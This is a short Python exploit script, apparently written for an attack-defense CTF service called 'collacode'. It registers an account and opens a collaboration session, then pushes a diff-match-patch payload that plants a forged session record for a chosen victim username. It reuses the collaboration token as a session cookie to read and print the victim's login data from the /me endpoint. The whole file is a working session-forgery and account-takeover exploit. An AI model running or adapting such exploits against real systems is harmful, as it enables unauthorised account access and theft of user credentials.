import sys
import json

from collacode_lib import *
from checker import Checker

from diff_match_patch import diff_match_patch


if len(sys.argv) < 3:
	print(f'Usage: {sys.argv[0]} ip username')
	exit(0)

ip = sys.argv[1]
username = sys.argv[2]

c = Checker(ip)

dmp = diff_match_patch()
sess_data = json.dumps({
	'username': username, 
	'password': 'pwned',
})
patch = dmp.patch_make('', sess_data)
diff = dmp.patch_toText(patch)


mch = CheckMachine(c)
u, p = mch.register()
sess = mch.login(u, p)

coll_token = mch.new_collab(sess, 'json')
coll_ws = mch.get_collab_out_ws()
mch.send_collab_data(coll_ws, coll_token, diff)


cookies = {
	'session': coll_token,
}

data = requests.get(f'{mch.url}/me', cookies=cookies)

print('Here\'s your login data:')
print(data.text)

